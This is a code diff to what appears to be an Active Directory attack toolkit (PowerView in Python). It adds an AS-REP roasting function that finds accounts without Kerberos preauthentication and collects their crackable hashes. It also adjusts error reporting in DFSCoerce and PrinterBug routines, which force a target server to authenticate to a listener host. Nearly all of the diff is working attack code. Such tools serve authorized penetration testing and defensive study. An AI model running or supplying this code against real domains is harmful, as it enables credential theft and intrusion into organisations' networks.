@@ -12,6 +12,7 @@ from powerview.modules.sccm import SCCM
 from powerview.modules.addcomputer import ADDCOMPUTER
 from powerview.modules.smbclient import SMBClient
 from powerview.modules.kerberoast import GetUserSPNs
+from powerview.modules.asreproast import ASREProast
 from powerview.modules.dacledit import DACLedit
 from powerview.modules.products import EDR
 from powerview.modules.gpo import GPO
@@ -3806,7 +3807,7 @@ displayName=New Group Policy Object
 		}
 			
 		stringBinding = KNOWN_PROTOCOLS[port]['bindstr'] % target
-		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding, interface_uuid=MSRPC_UUID_DFSNM)
+		dce = self.conn.connectRPCTransport(host=target, stringBindings=stringBinding, interface_uuid=dfsnm.MSRPC_UUID_DFSNM)
 
 		if dce is None:
 			logging.error("[Invoke-DFSCoerce] Failed to connect to %s" % (target))
@@ -3815,7 +3816,7 @@ displayName=New Group Policy Object
 		logging.debug("[Invoke-DFSCoerce] Connected to %s" % (target))
 
 		try:
-			request = NetrDfsRemoveStdRoot()
+			request = dfsnm.NetrDfsRemoveStdRoot()
 			request['ServerName'] = '%s\x00' % listener
 			request['RootShare'] = 'test\x00'
 			request['ApiFlags'] = 1
@@ -3823,7 +3824,8 @@ displayName=New Group Policy Object
 				request.dump()
 			resp = dce.request(request)
 		except Exception as e:
-			entry['attributes']['Status'] = 'Failed'
+			entry['attributes']['Status'] = 'Might work?'
+			entry['attributes']['Response'] = str(e)
 			logging.error("[Invoke-DFSCoerce] %s" % (str(e)))
 			return [entry]
 		
@@ -3901,7 +3903,8 @@ displayName=New Group Policy Object
 			resp = dce.request(request)
 		except Exception as e:
 			entry['attributes']['Status'] = 'Might work?'
-			logging.error('[Invoke-PrinterBug] %s' % (str(e)))
+			entry['attributes']['Response'] = str(e)
+			logging.debug('[Invoke-PrinterBug] %s' % (str(e)))
 			return [entry]
 
 		logging.debug('[Invoke-PrinterBug] Triggered RPC backconnect, this may or may not have worked')
@@ -3910,6 +3913,47 @@ displayName=New Group Policy Object
 
 		entry['attributes']['Status'] = 'Success'
 		return [entry]
+
+	def invoke_asreproast(self, identity='*', properties=[], searchbase=None, no_cache=False, args=None):
+		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
+		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
+		
+		# Ensure sAMAccountName is always included in properties
+		if not properties:
+			properties = ['sAMAccountName']
+		elif 'sAMAccountName' not in properties:
+			properties.append('sAMAccountName')
+			
+		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
+		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
+
+		setattr(args, 'preauthnotrequired', True)
+		users = self.get_domainuser(
+			identity=identity,
+			searchbase=searchbase,
+			no_cache=no_cache,
+			properties=properties,
+			args=args
+		)
+		logging.debug("[Invoke-ASREPRoast] Found %d users" % (len(users)))
+
+		entries = []
+		for user in users:
+			samaccountname = user.get("attributes").get("sAMAccountName")
+			if not samaccountname:
+				logging.debug("[Invoke-ASREPRoast] No samaccountname found for %s" % (user.get("attributes").get("dn")))
+				continue
+			asreproast = ASREProast(self)
+			tickets = asreproast.request(samaccountname)
+			entries.append(
+				{
+					"attributes": {
+						"sAMAccountName": samaccountname,
+						"Hash": tickets
+					}
+				}
+			)
+		return entries
 
 	def invoke_kerberoast(self, args, properties=[]):
 		# look for users with SPN set
